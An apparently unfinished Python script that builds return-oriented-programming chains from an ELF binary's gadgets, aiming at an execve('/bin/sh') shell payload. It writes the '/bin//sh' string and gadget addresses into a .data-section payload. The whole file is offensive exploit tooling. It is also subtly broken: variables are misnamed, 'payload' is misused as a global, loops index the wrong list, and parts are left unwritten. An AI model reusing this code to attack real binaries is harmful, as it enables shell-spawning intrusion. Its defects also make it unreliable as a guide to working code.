#!/usr/bin/python3

from elftools.elf.elffile import ELFFile
import capstone
import struct


# This file has routines which will get ROPChains for different exploit functions. 

payload = bytes()


def execveROPChain(GadgetList, vulnExecutable): 


    fd = open(vulnExecutable, "rb")
    elffile = ELFFile(fd)
    data_section = ".data"
    section = elffile.get_section_by_name(data_section)
    data_section_addr = section["sh_addr"]
    data_section_size = section["sh_size"]

    print(".data_section's address = ", hex(data_section_addr))
    print(".data_section's size = ", data_section_size)
    
    raxChain = list()
    rbxChain = list()
    rcxChain = list()
    rdxChain = list()
    syscallChain = list()

    getRaxChain(GadgetList)
    getRbxChain(GadgetList, data_section_addr)
    

def getRaxChain(GadgetList): 

    x = 0
    while x < len(GadgetList) :  

        gadget = GadgetList[x]    
        
        inst = gadget[0]
        if ',' in inst.op_str:
            operands = inst.op_str.split(',')
            operands[0].strip()
            operands[1].strip()
            a= ""
            b = ""
            for char in operands[0]:
                if(char != ' '):
                    a+= char
            for char in operands[1]:
                if(char != ' '):
                    b+= char

            # rax <- 11
            if inst.mnemonic == "mov" and a == "rax" and b == "11" : 
                payload = payload + struct.pack("<Q", inst.address)
                print("%s %s; " % (inst.mnemonic,inst.op_str), end = " ")
                raxChain.append(gadget)
                break
            
            elif inst.mnemonic == "xor" and a == "rax" and b == "rax" : 
                payload = payload + struct.pack("<Q", inst.address)
                print("%s %s; " % (inst.mnemonic,inst.op_str), end = " ")
                raxChain.append(gadget)
                # At this point, rax = 0
                # Should write code to make it to 11.
            
            elif inst.mnemonic == "mov" and a == "rax" and b.isdigit() : 
                payload = payload + struct.pack("<Q", inst.address)
                print("%s %s; " % (insn.mnemonic,insn.op_str), end = " ")
                raxChain.append(gadget)
                # At this point, rax = some constant.
                # Should write code to make it to 11
                
        x = x + 1


# -------------------------------------------------------------------

# Required : rbx <- Address of "/bin/sh"

def getRbxChain(GadgetList, data_section_addr): 


    Reg1 = str()
    Reg2 = str()
    popGadgetList = list()
    triedReg1 = list()
    triedReg2 = list()

    x = 0
    while x < len(GadgetList) : 

        gadget = GadgetList[x]
        inst = gadget[0]

        if inst.mnemonic == "pop" : 
            popGadgetList.append(gadget) 
        
        x = x + 1


    # Get the instruction in the gadget.
    
    x = 0
    while x < len(popGadgetList) : 

        gadget = GadgetList[x]
        inst = gadget[0]

        if inst.mnemonic == "pop" and inst.op_str != "rax" and Reg1 not in triedReg1: 
            Reg1 = inst.op_str
            triedReg1.append(Reg1)    
            payload += struct.pack("<Q", data_section_addr)
            payload += struct.pack("<Q", inst.address)
        
        x = x + 1
            

    x = 0
    while x < len(popGadgetList) :

        gadget = GadgetList[x]
        inst = gadget[0]

        if inst.mnemonic == "pop" and inst.op_str != "rax" and inst.op_str != Reg1: 
            Reg2 = inst.op_str

            payload += struct.pack("<Q", 0x68732f2f6e69622f)
            payload += struct.pack("<Q", inst.address)
        
        x = x + 1

    
    

    










